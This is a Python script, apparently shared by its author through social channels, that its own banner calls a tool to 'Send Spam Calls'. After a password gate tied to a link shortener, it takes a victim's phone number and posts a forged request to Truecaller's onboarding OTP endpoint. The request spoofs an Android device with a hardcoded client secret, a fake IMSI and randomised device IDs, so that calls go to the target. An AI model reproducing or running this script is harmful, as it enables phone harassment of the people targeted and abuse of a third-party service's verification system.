import random,sys,time,os,pyfiglet
from bs4 import BeautifulSoup as BS
from time import sleep
import requests

print ('\033[1;95mWelcome')
sleep (1)
print ()
print ('\033[1;92mclick on this link to get password👇')
#sleep (0.1)
print ()
link="\033[1;93m https://miklpro.com/sF9r"
print (link)
#sleep (1)
print ()
password=input ('\033[1;92m》Enter Password Script :  \033[1;96m')
sleep (1)

"""rrr=requests.get('https://pastelink.net/vsngvbe8').text
soup=BS(rrr,'html.parser')
lxc=(soup.find('div',{'class':'body-display'})).text"""

if password=='Abdullah7520': #in lxc:
    print ()
    print ('\033[1;96m》True Password《')
    sleep (1)
else:
    print ()
    print ('\033[1;91mError Password')
    exit()

print ()
nn='''\033[1;92m××××××××××××××××××××××××××××××××××××××××××××

######## Welcome To Abdullah Script #######

########## Script Send Spam Calls ########

####### Projected By Abdullah Salah #####'''
for I in nn+'\n':

	sys.stdout.write (I)
	sys.stdout.flush ()
	time.sleep (00.040)
print ()


logo6='''\033[;092m
░██████╗██████╗░░█████╗░███╗░░░███╗
██╔════╝██╔══██╗██╔══██╗████╗░████║
╚█████╗░██████╔╝███████║██╔████╔██║
░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║
██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║
╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝

░█████╗░░█████╗░██╗░░░░░██╗░░░░░  ██╗░░░██╗██████╗░
██╔══██╗██╔══██╗██║░░░░░██║░░░░░  ██║░░░██║╚════██╗
██║░░╚═╝███████║██║░░░░░██║░░░░░  ╚██╗░██╔╝░░███╔═╝
██║░░██╗██╔══██║██║░░░░░██║░░░░░  ░╚████╔╝░██╔══╝░░
╚█████╔╝██║░░██║███████╗███████╗  ░░╚██╔╝░░███████╗
░╚════╝░╚═╝░░╚═╝╚══════╝╚══════╝  ░░░╚═╝░░░╚══════╝


██████╗░██╗░░░██╗
██╔══██╗╚██╗░██╔╝
██████╦╝░╚████╔╝░
██╔══██╗░░╚██╔╝░░
██████╦╝░░░██║░░░
╚═════╝░░░░╚═╝░░░

░█████╗░██████╗░██████╗░██╗░░░██╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗██╔══██╗██║░░░██║██║░░░░░██║░░░░░
███████║██████╦╝██║░░██║██║░░░██║██║░░░░░██║░░░░░
██╔══██║██╔══██╗██║░░██║██║░░░██║██║░░░░░██║░░░░░
██║░░██║██████╦╝██████╔╝╚██████╔╝███████╗███████╗
╚═╝░░╚═╝╚═════╝░╚═════╝░░╚═════╝░╚══════╝╚══════╝
'''

for I in logo6 +'\n':
	sys.stdout.write (I)
	sys.stdout.flush ()
	time.sleep (00.0010)

i='''\033[1;092m Telegram channel : 

 http://t.me/Techno0099        

Youttube channel  : 

 https://youtube.com/channel/UCAbtkFAe9yyX0HJNFXyKJUg 

Facebook:

 https://www.facebook.com/AbdullahSalah0099/
'''
for I in i +'\n':
	sys.stdout.write (I)
	sys.stdout.flush ()
	time.sleep (00.0050)
print ()
print ("\033[1;093m*"*60)
print()
num=input ('\033[1;92m》Enter Phone Number : ')

import random
from time import sleep 
import requests 
#num=input ('》》Numper   :   ')
c=("1234567890")
m=("1234567890")
k=("1234567890")
rand1=''.join(random.choice(c))
rand2=''.join(random.choice(m))
rand3=''.join(random.choice(k))

url='https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp'

headers={
"Host": "account-asia-south1.truecaller.com",

"content-type": "application/json; charset=UTF-8",
"content-length": "580",

"accept-encoding": "gzip",
"user-agent": "Truecaller/12.20.6 (Android;7.0)",

"clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
}

data={
  "countryCode": "eg",
  "dialingCode": 20,
  "installationDetails": {
    "app": {
      "buildVersion": 6,
      "majorVersion": 12,
      "minorVersion": 20,
      "store": "GOOGLE_PLAY"
    },
    "device": {
      "deviceId": rand1+rand2+rand3+"7cd17e37d121d",
      "language": "ar",
      "manufacturer": "Infinix",
      "mobileServices": [
        "GMS"
      ],
      "model": "Infinix X559C",
      "osName": "Android",
      "osVersion": "7.0",
      "simSerials": [ rand1+rand2+rand3+"0018521312806439f"
      ]
    },
    "language": "ar",
    "sims": [
      {
        "imsi": "602018531280643",
        "mcc": "602",
        "mnc": "2",
        "operator": "Orange EG"
      }
    ],
    "storeVersion": {
      "buildVersion": 6,
      "majorVersion": 12,
      "minorVersion": 20
    }
  },
  "phoneNumber": num,
  "region": "region-2",
  "sequenceNo": 4
}
print ()
r=requests.post (url,headers=headers, json=data)
print (r.text)
if (r.json()["status"])==1:
    print ('\033[1;92mCalling....')
    print ()
    sleep(5)
    print ('\033[1;96mDone Call')
elif(r.json()["status"])==5:
    print('\033[1;91mTry After 24 Hours For This Number')
elif (r.json()["status"])==4:
    print ("\033[1;91mcan't call try Later")
else:
    print ("\033[1;91mcan't call try Later")


    


